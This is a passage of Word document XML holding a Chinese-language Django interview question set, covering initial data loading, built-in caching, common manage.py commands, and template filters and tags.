        <w:t xml:space="preserve"> 就是一个生产环境了，能够将用户访问请求与应用 app 隔离开，实现真正的部署 。相比来讲，支持的并发量更高，方便管理多进程，发挥多核的优势，提升性能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D9FE1ED" w14:textId="25B7FF1A" w:rsidR="006B2B80" w:rsidRPr="002111E5" w:rsidRDefault="002111E5" w:rsidP="002111E5">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="47" w:name="t63"/>
      <w:bookmarkStart w:id="48" w:name="t64"/>
      <w:bookmarkStart w:id="49" w:name="t65"/>
      <w:bookmarkEnd w:id="47"/>
      <w:bookmarkEnd w:id="48"/>
      <w:bookmarkEnd w:id="49"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>071</w:t>
      </w:r>
      <w:r>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Django</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中如何加载初始化数据 </w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29AB30D1" w14:textId="77777777" w:rsidR="006B2B80" w:rsidRPr="00F532EB" w:rsidRDefault="006B2B80" w:rsidP="00F532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532EB">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>    Django在创建对象时在掉用save()方法后，ORM框架会把对象的属性转换为写入到数据库中，实现对数据库的初始化；通过操作对象，查询数据库，将查询集返回给视图函数，通过模板语言展现在前端页面</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="277C952C" w14:textId="30EA6690" w:rsidR="006B2B80" w:rsidRPr="002111E5" w:rsidRDefault="002111E5" w:rsidP="002111E5">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="50" w:name="t66"/>
      <w:bookmarkEnd w:id="50"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>072</w:t>
      </w:r>
      <w:r>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简述</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>下的（内建）缓存机制？</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71738B41"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Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>  Django</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>根据设置的缓存方式，浏览器第一次请求时，</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>cache</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>会缓存单个变量或整个网页等内容到硬盘或者内存中，同时设置</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>response</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>头部，当浏览器再次发起请求时，附带</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>f-Modified-Since</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求时间到</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Django </w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>发现</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>f-Modified-Since</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>会先去参数之后，会与缓存中的过期时间相比较，如果缓存时间比较新，则会重新请求数据，并缓存起来然后返回</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>response</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>给客户端，如果缓存没有过期，则直接从缓存中提取数据，返回给</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>response</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>给客户端。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78B22762"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&lt;wiz_tmp_tag id="wiz-table-range-border" contenteditable="false" style="display: none;"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="659DD4A8"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转载于</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>:https://www.cnblogs.com/lys666/p/10472317.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72F42D2F" w14:textId="6B1C8C85" w:rsidR="006B2B80" w:rsidRPr="002111E5" w:rsidRDefault="002111E5" w:rsidP="006B2B8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073</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>常用命令</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C766374"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创建项目</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>django-admin startproject mysite</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04D22AE4"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创建</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>apppython manage.py startapp app01</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DC426D3"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启动项目</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>python manage.py runserver</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="391236C2"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修改端口号</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>python manage.py runserver 127.0.0.1:</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>新端口号</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ACB7C9B"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生成迁移文件</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>python manage.py makemigrations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B780EC4"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t>同步数据库</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>python manage.py migrate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07DB417C"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hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>收集静态文件</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>python manage.py collectstatic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="016BE214" w14:textId="2C4EED18" w:rsidR="006B2B80" w:rsidRPr="002111E5" w:rsidRDefault="002111E5" w:rsidP="006B2B8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74</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中常见的过滤器和标签</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22CCDD4D"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xml:space="preserve">{{ </w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>变量名</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>|</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>过滤器名称</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>参数</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2852AA1E"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default</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:tab/>
        <w:t>length</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:tab/>
        <w:t>slice</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:tab/>
        <w:t>date</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:tab/>
        <w:t>safe</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:tab/>
        <w:t>cut</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:tab/>
        <w:t>join</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06550965"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xml:space="preserve">{%tags </w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>标签</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>%}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07562446"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xml:space="preserve">{%for </w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>临时变量</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> in </w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>序列</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> %} ... {%endfor%}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EBA5295"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for .. in .. %} ... {% empty %} ... {% endfor %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CFEE25B"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if .. %}  ... {% endif %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="793E6C13"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if name_length|length &gt; 6 %} ... {% else %}   ... {% endif %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AC50122"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if name_length|length &gt; 6 %} ... {% elif age == 20 %} ... {% else %}  ... {% endif %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22C9710F" w14:textId="77777777" w:rsidR="006B2B80" w:rsidRPr="00FD3F5C" w:rsidRDefault="006B2B80"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FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">load </w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
